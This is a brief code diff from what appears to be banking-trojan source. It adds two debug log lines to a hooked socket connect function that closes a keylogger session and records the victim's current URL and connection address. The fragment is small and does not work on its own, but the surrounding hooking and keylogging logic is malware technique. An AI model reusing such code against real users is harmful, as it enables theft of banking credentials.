@@ -151,6 +151,9 @@ namespace IBank
 		// Идёт запрос на сервер, закрываем систему.
 		KeyLogger::CloseSession();
 
+		IBDBG("IBank", "--------Connect %s", KeyLogger::GetCurrentURL());
+		IBDBG("IBank", "--------Connect %s \r\n %d", name->sa_data, namelen);
+
     	return Real_Connect(s, name, namelen);
     }
 	//-----------------------------------------------------------------------
